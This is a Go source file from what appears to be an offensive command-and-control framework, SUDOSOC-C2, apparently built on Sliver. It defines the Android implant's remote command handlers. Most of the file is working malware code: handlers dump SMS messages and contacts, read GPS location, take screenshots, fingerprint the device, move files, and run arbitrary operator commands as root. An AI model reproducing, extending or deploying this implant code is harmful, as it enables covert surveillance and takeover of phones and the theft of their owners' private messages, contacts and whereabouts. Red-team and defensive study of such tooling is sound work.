//go:build android

package handlers

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  sudosoc — Seif

	Android-specific command handlers for the Phantom Mobile Engine.
	Generic handlers (execute, ls, download, upload, etc.) are inherited
	from handlers.go which compiles on all platforms.

	Android-specific responses are wrapped in Execute/Ls responses
	(using Stdout field) until `make pb` regenerates proper proto stubs.
*/

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"syscall"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/android"
	"github.com/sudosoc/SUDOSOC-C2/protobuf/commonpb"
	"github.com/sudosoc/SUDOSOC-C2/protobuf/sudosocpb"
	"google.golang.org/protobuf/proto"
)

// androidHandlers — Full handler map for Android Phantom implant
var androidHandlers = map[uint32]RPCHandler{
	// ── Generic (from handlers.go) ───────────────────────────────
	sudosocpb.MsgPing:           pingHandler,
	sudosocpb.MsgLsReq:          dirListHandler,
	sudosocpb.MsgDownloadReq:    downloadHandler,
	sudosocpb.MsgUploadReq:      uploadHandler,
	sudosocpb.MsgCdReq:          cdHandler,
	sudosocpb.MsgPwdReq:         pwdHandler,
	sudosocpb.MsgRmReq:          rmHandler,
	sudosocpb.MsgMkdirReq:       mkdirHandler,
	sudosocpb.MsgMvReq:          mvHandler,
	sudosocpb.MsgCpReq:          cpHandler,
	sudosocpb.MsgExecuteReq:     executeHandler,
	sudosocpb.MsgEnvReq:         getEnvHandler,
	sudosocpb.MsgSetEnvReq:      setEnvHandler,
	sudosocpb.MsgUnsetEnvReq:    unsetEnvHandler,
	sudosocpb.MsgGrepReq:        grepHandler,
	sudosocpb.MsgReconfigureReq: reconfigureHandler,
	sudosocpb.MsgIfconfigReq:    androidIfconfigHandler,
	sudosocpb.MsgNetstatReq:     androidNetstatHandler,

	// ── Android-specific ─────────────────────────────────────────
	sudosocpb.MsgAndroidDeviceInfoReq: androidDeviceInfoHandler,
	sudosocpb.MsgAndroidAppsReq:       androidAppsHandler,
	sudosocpb.MsgAndroidSMSReq:        androidTextHandler(android.DumpSMS),
	sudosocpb.MsgAndroidContactsReq:   androidTextHandler(android.DumpContacts),
	sudosocpb.MsgAndroidLocationReq:   androidTextHandler(android.GetLocationFromGPS),
	sudosocpb.MsgAndroidWifiReq:       androidTextHandler(android.GetNetworkInterfaces),
	sudosocpb.MsgAndroidStorageReq:    androidTextHandler(android.GetStorageInfo),
	sudosocpb.MsgAndroidBatteryReq:    androidTextHandler(android.GetBatteryInfo),
	sudosocpb.MsgAndroidRootShellReq:  androidRootShellHandler,
	sudosocpb.MsgScreenshotReq:        androidScreenshotHandler,

	// ── Wasm ─────────────────────────────────────────────────────
	sudosocpb.MsgRegisterWasmExtensionReq:   registerWasmExtensionHandler,
	sudosocpb.MsgDeregisterWasmExtensionReq: deregisterWasmExtensionHandler,
	sudosocpb.MsgListWasmExtensionsReq:      listWasmExtensionsHandler,
}

// GetSystemHandlers returns the Android-specific handler map
func GetSystemHandlers() map[uint32]RPCHandler {
	return androidHandlers
}

// GetSystemTunnelHandlers — Android doesn't support tunnels yet
func GetSystemTunnelHandlers() map[uint32]TunnelHandler {
	return map[uint32]TunnelHandler{}
}

// GetSystemPivotHandlers — Android pivot support (future)
func GetSystemPivotHandlers() map[uint32]TunnelHandler {
	return map[uint32]TunnelHandler{}
}

// ════════════════════════════════════════════════════════════════════
// Helpers
// ════════════════════════════════════════════════════════════════════

// androidTextHandler wraps a func() string as an RPCHandler
// that returns the text output in an Execute.Stdout field
func androidTextHandler(fn func() string) RPCHandler {
	return func(data []byte, resp RPCResponse) {
		text := fn()
		response := &sudosocpb.Execute{
			Stdout:   []byte(text),
			Response: &commonpb.Response{},
		}
		out, err := proto.Marshal(response)
		resp(out, err)
	}
}

// ════════════════════════════════════════════════════════════════════
// Android-Specific Handlers
// ════════════════════════════════════════════════════════════════════

func androidDeviceInfoHandler(data []byte, resp RPCResponse) {
	// {{if .Config.Debug}}
	log.Printf("[android] deviceinfo request")
	// {{end}}

	info := android.GetDeviceInfo()

	// Serialize as JSON wrapped in Execute.Stdout
	// (replaced by proper proto after `make pb`)
	infoMap := map[string]interface{}{
		"Manufacturer": info.Manufacturer,
		"Model":        info.Model,
		"AndroidVer":   info.AndroidVer,
		"SdkVersion":   info.SDKVersion,
		"Hostname":     info.Hostname,
		"Username":     info.Username,
		"Arch":         info.Arch,
		"IsRooted":     info.IsRooted,
		"BuildId":      info.BuildID,
		"Fingerprint":  info.Fingerprint,
		"SerialNumber": info.SerialNumber,
	}

	jsonBytes, _ := json.MarshalIndent(infoMap, "", "  ")

	response := &sudosocpb.Execute{
		Stdout:   jsonBytes,
		Response: &commonpb.Response{},
	}
	out, err := proto.Marshal(response)
	resp(out, err)
}

func androidAppsHandler(data []byte, resp RPCResponse) {
	// {{if .Config.Debug}}
	log.Printf("[android] apps list request")
	// {{end}}

	apps := android.ListInstalledApps()
	type appEntry struct {
		PackageName string `json:"package"`
		APKPath     string `json:"apk_path"`
	}
	entries := make([]appEntry, 0, len(apps))
	for _, a := range apps {
		entries = append(entries, appEntry{
			PackageName: a.PackageName,
			APKPath:     a.APKPath,
		})
	}

	jsonBytes, _ := json.MarshalIndent(entries, "", "  ")
	response := &sudosocpb.Execute{
		Stdout:   jsonBytes,
		Response: &commonpb.Response{},
	}
	out, err := proto.Marshal(response)
	resp(out, err)
}

func androidScreenshotHandler(data []byte, resp RPCResponse) {
	// {{if .Config.Debug}}
	log.Printf("[android] screenshot request")
	// {{end}}

	img, err := android.Screenshot()
	response := &sudosocpb.Screenshot{
		Data:     img,
		Response: &commonpb.Response{},
	}
	if err != nil {
		response.Response.Err = err.Error()
	}
	out, _ := proto.Marshal(response)
	resp(out, err)
}

func androidRootShellHandler(data []byte, resp RPCResponse) {
	req := &sudosocpb.ExecuteReq{}
	if err := proto.Unmarshal(data, req); err != nil {
		resp([]byte{}, err)
		return
	}

	command := req.Path
	for _, arg := range req.Args {
		command += " " + arg
	}

	output, err := android.ExecAsRoot(command)
	response := &sudosocpb.Execute{
		Stdout:   []byte(output),
		Response: &commonpb.Response{},
	}
	if err != nil {
		response.Stderr = []byte(err.Error())
		response.Status = 1
	}
	out, _ := proto.Marshal(response)
	resp(out, nil)
}

// ════════════════════════════════════════════════════════════════════
// Android Platform Stubs (required by handlers.go)
// ════════════════════════════════════════════════════════════════════

// getUid — returns file owner UID as string
func getUid(fileInfo os.FileInfo) string {
	if stat, ok := fileInfo.Sys().(*syscall.Stat_t); ok {
		return fmt.Sprintf("%d", stat.Uid)
	}
	return ""
}

// getGid — returns file owner GID as string
func getGid(fileInfo os.FileInfo) string {
	if stat, ok := fileInfo.Sys().(*syscall.Stat_t); ok {
		return fmt.Sprintf("%d", stat.Gid)
	}
	return ""
}

// androidIfconfigHandler — network interface info for Android
func androidIfconfigHandler(_ []byte, resp RPCResponse) {
	netInfo := android.GetNetworkInterfaces()
	response := &sudosocpb.Execute{
		Stdout:   []byte(netInfo),
		Response: &commonpb.Response{},
	}
	out, err := proto.Marshal(response)
	resp(out, err)
}

// androidNetstatHandler — active network connections on Android
func androidNetstatHandler(_ []byte, resp RPCResponse) {
	out, err := exec.Command("/bin/sh", "-c",
		"cat /proc/net/tcp 2>/dev/null; cat /proc/net/tcp6 2>/dev/null; netstat -an 2>/dev/null").CombinedOutput()
	response := &sudosocpb.Execute{
		Stdout:   out,
		Response: &commonpb.Response{},
	}
	if err != nil {
		response.Response.Err = err.Error()
	}
	outBytes, _ := proto.Marshal(response)
	resp(outBytes, nil)
}
